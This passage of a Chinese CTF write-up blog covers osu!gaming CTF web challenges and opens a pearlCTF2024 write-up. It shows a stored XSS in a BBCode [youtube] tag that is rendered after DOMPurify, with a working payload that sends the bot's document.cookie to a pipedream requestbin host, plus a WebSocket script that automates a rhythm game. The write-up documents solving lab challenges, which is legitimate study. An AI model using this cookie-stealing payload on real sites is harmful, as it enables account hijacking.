token&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">headers</span>.<span class="property">csrf</span> !== req.<span class="property">cookies</span>.<span class="property">csrf</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;invalid csrf token&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bio.<span class="property">length</span> &gt; <span class="number">2048</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;bio too long&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.<span class="property">user</span>.<span class="property">bio</span> = <span class="title function_">renderBio</span>(bio);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`Bio updated!`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>会把update的bio显示在ui上，并且除了<code>DOMPurify</code>没有任何限制，那么显然注入点就在这里了</p><p>跟着分析，我们需要构造的bio，看看这个修改bio的函数<code>renderBio()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">renderBBCode</span> = (<span class="params">data</span>) =&gt; &#123;</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[b\](.+?)\[\/b\]/g</span>, <span class="string">&#x27;&lt;strong&gt;$1&lt;/strong&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[i\](.+?)\[\/i\]/g</span>, <span class="string">&#x27;&lt;i&gt;$1&lt;/i&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[u\](.+?)\[\/u\]/g</span>, <span class="string">&#x27;&lt;u&gt;$1&lt;/u&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[strike\](.+?)\[\/strike\]/g</span>, <span class="string">&#x27;&lt;strike&gt;$1&lt;/strike&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[color=#([0-9a-f]&#123;6&#125;)\](.+?)\[\/color\]/g</span>, <span class="string">&#x27;&lt;span style=&quot;color: #$1&quot;&gt;$2&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[size=(\d+)\](.+?)\[\/size\]/g</span>, <span class="string">&#x27;&lt;span style=&quot;font-size: $1px&quot;&gt;$2&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[url=(.+?)\](.+?)\[\/url\]/g</span>, <span class="string">&#x27;&lt;a href=&quot;$1&quot;&gt;$2&lt;/a&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[img\](.+?)\[\/img\]/g</span>, <span class="string">&#x27;&lt;img src=&quot;$1&quot; /&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">renderBio</span> = (<span class="params">data</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="title function_">renderBBCode</span>(data);</span><br><span class="line">    <span class="keyword">const</span> sanitized = purify.<span class="title function_">sanitize</span>(html);</span><br><span class="line">    <span class="comment">// do this after sanitization because otherwise iframe will be removed</span></span><br><span class="line">    <span class="keyword">return</span> sanitized.<span class="title function_">replaceAll</span>(</span><br><span class="line">        <span class="regexp">/\[youtube\](.+?)\[\/youtube\]/g</span>,</span><br><span class="line">        <span class="string">&#x27;&lt;iframe sandbox=&quot;allow-scripts&quot; width=&quot;640px&quot; height=&quot;480px&quot; src=&quot;https://www.youtube.com/embed/$1&quot; frameborder=&quot;0&quot; allowfullscreen&gt;&lt;/iframe&gt;&#x27;</span></span><br><span class="line">    );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>会把固定格式替换成html标签，下面就简单了，闭合一下$1处的引号，构造payload尝试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[youtube]1&quot; onload=&quot;alert(1);[/youtube]</span><br></pre></td></tr></table></figure><p>控制台发送请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/update&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="attr">csrf</span>: <span class="string">&#x27;ed25eb2240494098879f95bef00d39940737a10165d90a1f9c2dbe8235fe3cf5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">        <span class="attr">bio</span>: <span class="string">&#x27;[youtube]11&quot; onload=&quot;alert(1)&quot; [/youtube]&#x27;</span></span><br><span class="line">    &#125;).<span class="title function_">toString</span>()</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>())</span><br></pre></td></tr></table></figure><p>弹窗成功</p><p>接下来就简单看一下机器人</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//adminbot_test.js</span></span><br><span class="line"><span class="comment">// admin bot test script</span></span><br><span class="line"><span class="comment">// npm i puppeteer</span></span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&quot;puppeteer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = <span class="string">&quot;osu&#123;test_flag&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&quot;https://profile-page.web.osugaming.lol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sleep</span> = ms =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, ms));</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> browser;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">            <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">pipe</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">args</span>: [</span><br><span class="line">                <span class="string">&quot;--no-sandbox&quot;</span>,</span><br><span class="line">                <span class="string">&quot;--disable-setuid-sandbox&quot;</span>,</span><br><span class="line">                <span class="string">&quot;--js-flags=--noexpose_wasm,--jitless&quot;</span>,</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">dumpio</span>: <span class="literal">true</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="variable constant_">SITE</span>, &#123; <span class="attr">timeout</span>: <span class="number">3000</span>, <span class="attr">waitUntil</span>: <span class="string">&#x27;domcontentloaded&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">evaluate</span>(<span class="function">(<span class="params">flag</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;flag=&quot;</span> + flag + <span class="string">&quot;; secure; path=/&quot;</span>;</span><br><span class="line">        &#125;, <span class="variable constant_">FLAG</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">close</span>();</span><br><span class="line">        page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">timeout</span>: <span class="number">3000</span>, <span class="attr">waitUntil</span>: <span class="string">&#x27;domcontentloaded&#x27;</span> &#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">        browser = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (browser) <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">visit</span>(<span class="string">&quot;EXPLOIT_URL&quot;</span>);</span><br></pre></td></tr></table></figure><p>机器人直接把flag写在cookie里，访问一下应该就有了</p><p>接下来就是找个站接收，推荐用这个站<a href="https://pipedream.com/requestbin">https://pipedream.com/requestbin</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/update&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="attr">csrf</span>: <span class="string">&#x27;ed25eb2240494098879f95bef00d39940737a10165d90a1f9c2dbe8235fe3cf5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">        <span class="attr">bio</span>: <span class="string">&#x27;[youtube]11&quot; onload=&quot;fetch(`https://eonngzestk4l8vk.m.pipedream.net/`)&quot; [/youtube]&#x27;</span></span><br><span class="line">    &#125;).<span class="title function_">toString</span>()</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>())</span><br></pre></td></tr></table></figure><p>然后把用户页面丢到机器人那里，发现并没有把cookie带出来，修改一下payload，让url把cookie带回来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/update&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="attr">csrf</span>: <span class="string">&#x27;ed25eb2240494098879f95bef00d39940737a10165d90a1f9c2dbe8235fe3cf5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">        <span class="attr">bio</span>: <span class="string">&#x27;[youtube]11&quot; onload=&quot;fetch(`https://eonngzestk4l8vk.m.pipedream.net/`+document.cookie)&quot; [/youtube]&#x27;</span></span><br><span class="line">    &#125;).<span class="title function_">toString</span>()</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>())</span><br></pre></td></tr></table></figure><p>成功得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osu&#123;but_all_i_w4nted_to_do_was_w4tch_y0utube...&#125;</span><br></pre></td></tr></table></figure><p>至于说上面的一点点非预期，简单解释一下，因为是公共靶机，你可以通过公共靶机访问别人创建的任何账号，并且<strong>没有任何检查限制</strong>，幸运的我尝试的第一个用户(111111111)就是成功的，访问了之后发现他用户信息那边有图片，好奇怎么插入图片的，就找到了bio，我一开始还看不懂bio是什么，最后就顺藤摸瓜了做了出来&#x3D; &#x3D;</p><h2 id="stream-vs-79-solves-138-points"><a href="#stream-vs-79-solves-138-points" class="headerlink" title="stream-vs(79 solves &#x2F; 138 points)"></a><strong>stream-vs</strong>(79 solves &#x2F; 138 points)</h2><p><a href="https://stream-vs.web.osugaming.lol/">https://stream-vs.web.osugaming.lol/</a></p><p>里面是一个小游戏，一开始没搞懂什么意思，简单玩了一会发现是点击频率要和bpm一样，然后打败cookiezi获得flag，这时候就需要写脚本了</p><p>直接执行肯定会慢几拍，所以需要从开始就执行，可以用js的WebSocket访问执行，然后读取bpm然后模拟，下面给出代码（晨曦大佬写的脚本）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://stream-vs.web.osugaming.lol&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> clicks = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line"></span><br><span class="line">ws.<span class="property">onopen</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;login&quot;</span>, <span class="attr">data</span>: <span class="string">&quot;admin4&quot;</span> &#125;));</span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;challenge&quot;</span> &#125;));</span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;start&quot;</span> &#125;));</span><br><span class="line">&#125;;</span><br><span class="line">ws.<span class="property">onmessage</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">const</span> &#123; type, data &#125; = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(e.<span class="property">data</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line"><span class="title function_">run</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">run</span> = <span class="keyword">async</span> (<span class="params">session</span>) =&gt; &#123;</span><br><span class="line"><span class="keyword">let</span> bmp = session.<span class="property">songs</span>[session.<span class="property">round</span>].<span class="property">bpm</span>; </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;bmp = &quot;</span>+bmp);</span><br><span class="line">    clicks.<span class="title function_">clear</span>();</span><br><span class="line">    <span class="keyword">let</span> start = +<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    recording = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">let</span> click_data = performance.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">let</span> end = start + session.<span class="property">songs</span>[session.<span class="property">round</span>].<span class="property">duration</span> * <span class="number">1000</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">let</span> times = end - start;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;times = &quot;</span>+times);</span><br><span class="line"><span class="keyword">let</span> cnt = <span class="title class_">Math</span>.<span class="title function_">round</span>(bmp * <span class="number">4</span> /<span class="number">60000</span> * times); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;cnt = &quot;</span>+cnt);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;=cnt; i++)</span><br><span class="line">&#123;</span><br><span class="line">clicks.<span class="title function_">add</span>(click_data+<span class="number">0.00999998808</span>);</span><br><span class="line">&#125;</span><br><span class="line">    recording = <span class="literal">false</span>;</span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;results&quot;</span>, <span class="attr">data</span>: &#123; <span class="attr">clicks</span>: [...clicks], start, end &#125; &#125;));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>run了之后在控制台看见flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osu&#123;are_y0u_a_r0b0t?&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>prealCTF2024 wp</title>
      <link href="/2024/07/14/prealCTF2024-wp/"/>
      <url>/2024/07/14/prealCTF2024-wp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>teamName: Ciallo～(∠・ω&lt; )⌒☆</p><p>rank: #6</p><p>points:  7575</p><p>Reversing: 1474&#x2F;7575</p><p>Miscellaneous: 438&#x2F;7575</p><p>Crypto: 1,248&#x2F;7575</p><p>Forensics: 904&#x2F;7575</p><p>Web: 1169&#x2F;7575</p><p>Blockchain: 788&#x2F;7575</p><p>OSINT: 100&#x2F;7575</p><p>Pwn: 1454&#x2F;7575</p></blockquote><p>这次比赛收获很多，也是和一群很强的师傅打，也感受到了自己确实很菜;w;</p><h2 id="learn-HTTP-76-Solves-50-Points"><a href="#learn-HTTP-76-Solves-50-Points" class="headerlink" title="learn HTTP(76 Solves&#x2F;50 Points)"></a><strong>learn HTTP</strong>(76 Solves&#x2F;50 Points)</h2><p><a href="https://learn-http.ctf.pearlctf.in/">https://learn-http.ctf.pearlctf.in</a></p><p>给的是一个公共靶机里面有一个机器人那大概率是xss了，题目还给了附件，先简单看一下页面，看看题目要我们干什么，里面要我们写一个类似http请求的东西，然后把生成好的payload交给机器人检查，接下来我们看一下源码</p><p>先看一下nodejs的源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).<span class="title function_">config</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> childProcess = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)))</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;))</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;templates/index.html&quot;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">genToken</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">id</span>: <span class="number">1</span> &#125;, process.<span class="property">env</span>.<span class="property">SECRET</span>);</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/check&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> req_body = req.<span class="property">body</span>.<span class="property">body</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (req_body == <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Body is not provided&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> to_req = <span class="string">`http://localhost:5001/resp?body=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(req_body)&#125;</span>`</span></span><br><span class="line"></span><br><span class="line">        childProcess.<span class="title function_">spawn</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;./bot.js&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>: to_req,</span><br><span class="line">            <span class="attr">token</span>: <span class="title function_">genToken</span>()</span><br><span class="line">        &#125;)]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Admin will check!&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Internal Server Error&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> decoded = jwt.<span class="title function_">verify</span>(token, process.<span class="property">env</span>.<span class="property">SECRET</span>)</span><br><span class="line">        <span class="keyword">if</span> (decoded.<span class="property">id</span> != <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not verified&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">FLAG</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not verified&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&quot;5000&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Server started&quot;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>有三个路由，逻辑都很简单， <code>/</code>就是显示主页，<code>/check</code>检查你构造的payload，并带上cookie(token)，<code>/flag</code>检查你的token  有没有修改如果有就返回flag</p><p>然后我们开看看另一个go的源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 